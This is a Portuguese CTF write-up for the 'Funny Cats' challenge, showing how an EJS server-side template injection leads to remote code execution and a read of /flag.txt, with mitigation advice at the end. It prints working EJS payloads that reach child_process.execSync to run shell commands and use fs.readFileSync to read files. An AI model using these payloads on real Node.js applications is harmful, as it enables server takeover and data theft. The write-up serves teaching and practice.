
---

# 🛡️ Desafio de Template Injection no site Chapéu de Palha Hacker

> *"Esses gatos escondem algo... Descubra o que é!"*

---

## 📌 Contexto Rápido

| Item | Detalhe |
| :---------------------- | :-------------------------------------------------------------------------- |
| 🎯 **Nome do Desafio** | **Funny Cats** |
| 📍 **Local da Flag** | `/flag.txt` |
| 🌐 **URL** | [https://funny-cats.chapeudepalhahacker.club/](https://funny-cats.chapeudepalhahacker.club/) |
| 💡 **Observação Inicial** | Encontra a flag ara pontuar. |

---

## 1️⃣ Introdução à Vulnerabilidade

### 🤔📚 O que é Template Injection?

**Template Injection** é uma vulnerabilidade que ocorre quando a entrada do usuário é injetada diretamente em um template sem o devido tratamento. Isso permite que um atacante execute código malicioso dentro do ambiente do servidor, explorando o sistema de templates utilizado pela aplicação.

Sistemas como **Jinja2**, **Twig**, **Smarty**, **Freemarker**, e **EJS** são amplamente usados em aplicações web para separar lógica de negócio da apresentação. Eles permitem a inserção de variáveis e estruturas de controle (como loops e condicionais) dentro de templates dinâmicos. Quando a entrada do usuário é incorporada diretamente no template sem escape ou validação, um atacante pode abusar da própria sintaxe do motor de templates para manipular o comportamento da aplicação — e, em alguns casos, executar comandos arbitrários no servidor. ⚠️💻

### 💡🔍 Como Funciona?

Imagine um campo de entrada cujo conteúdo é renderizado diretamente por um motor de template. Em EJS, por exemplo, `<%= 7 * 7 %>` renderiza `49`.

Se o conteúdo enviado por um usuário for passado diretamente ao template, um atacante pode tentar algo como:

```ejs
<%= require('child_process').execSync('id').toString() %>
```

Se o ambiente permitir, esse código executa o comando `id` no sistema operacional. Assim, identificar o motor de template e entender sua sintaxe é essencial para explorar a falha. 🚀🔓

---

## 2️⃣ Análise do Desafio e Identificação da Vulnerabilidade

Comecei explorando a aplicação web, buscando interações e pistas no código-fonte. Logo percebi um comentário HTML curioso:

```html
```

A URL acessada era:

```text
gato?name=alfredo
```

Ao alterar o parâmetro para `teste123` (`gato?name=teste123`), o comentário foi atualizado:

```html
```

🚨 **Entrada refletida diretamente em HTML = potencial vulnerabilidade.**

Decidi então testar se a aplicação processava a entrada como parte de um template. Após algumas tentativas com payloads comuns (URL-encoded), utilizei:

```matlab
<%= 2*2 %>
```

O resultado refletido foi:

```html
```

✅ **Vulnerabilidade confirmada!**
A aplicação estava vulnerável a **Template Injection**, e a sintaxe indicava que o motor usado era provavelmente **EJS** (Embedded JavaScript), popular em ambientes Node.js. 🐾🔥

---

## 3️⃣ Exploração da Vulnerabilidade: Rumo à Flag

Com a vulnerabilidade confirmada, o próximo passo foi alcançar uma **Execução Remota de Código (RCE)** para acessar a flag do sistema, que estava armazenada em `/flag.txt`. 🚀📄

### 🔹 Passo 1: Execução Remota de Código (RCE)

#### Payload:

```ejs
<%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls /").toString() %>
```

#### Explicação:

* `<%= ... %>`: Sintaxe do EJS para executar e renderizar o resultado do código. 📝
* `this.constructor.constructor(...)`: Acesso ao construtor global `Function`, permitindo criar e executar funções arbitrárias. 🏗️
* `"return process"`: Retorna o objeto `process`, que contém informações e métodos do ambiente Node.js. 🌐
* `.mainModule.require(...)`: Através de `mainModule`, acessa-se o `require`, permitindo importar módulos internos. 📦
* `"child_process"`: Módulo que permite executar comandos do sistema operacional. 🖥️
* `.execSync("ls /")`: Executa o comando `ls /` de forma síncrona, listando arquivos do diretório raiz. 📂
* `.toString()`: Converte o buffer da saída em string legível. 🔤

#### Resultado:

A resposta refletiu a listagem dos arquivos raiz, incluindo o **flag.txt** — sucesso na obtenção de RCE! 🎉🔓

---

### 🔹 Passo 2: Leitura da Flag

Com a flag localizada, bastava ler seu conteúdo. 📖✨

#### Payload:

```ejs
<%= global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8') %>
```

#### Explicação:

* Acessa o módulo `fs` (File System) por meio do objeto global `process`. 🗄️
* `readFileSync('/flag.txt', 'utf8')`: Lê o conteúdo do arquivo de forma síncrona e o interpreta como texto UTF-8. 📜

#### Resultado:

A flag foi exibida diretamente no comentário HTML:

```php-template
```

🏁 **Flag capturada com sucesso!** 🎊🐾

---

## 🧩 4. Lições Aprendidas

### ✔️ Boas Práticas

* **Validação e escape de entrada:** Nunca insira dados do usuário diretamente em templates.
* **Menor privilégio:** Rode o servidor com permissões mínimas.
* **Evite exposição de objetos globais:** Como `require`, `process`, e afins.
* **Utilize ambientes sandboxed:** Sempre que possível.

### 🔐 Como prevenir Template Injection?

| Prática | Descrição |
| :---------------------------------------- | :------------------------------------------------------------------------ |
| 🧼 **Sanitização de entrada** | Escapar caracteres especiais e remover trechos perigosos. |
| 🛑 **Evite lógica dinâmica com input** | Não use diretamente dados do usuário na lógica de template. |
| 🔒 **Restrição do ambiente de execução** | Use sandbox ou limitações no acesso a objetos como `require`, `process`. |
| 🧱 **Use templates seguros** | Motores de template com proteções por padrão são preferíveis. |

---

## 🏁 Conclusão

Esse desafio mostrou como uma simples reflexão de parâmetro pode evoluir para execução de código remoto — tudo devido à falta de tratamento adequado em um motor de template.

🔁 **Resumo da exploração:**

1.  Identifiquei o reflexo no HTML.
2.  Confirmei que era um motor de template (EJS).
3.  Usei payloads para explorar o sistema e capturar a flag.

⚠️ **Lembre-se:** vulnerabilidades como essa podem comprometer um sistema inteiro. Desenvolvedores devem sempre validar inputs, aplicar o princípio de menor privilégio e manter suas dependências atualizadas.

---

🧠 **Desafio vencido!**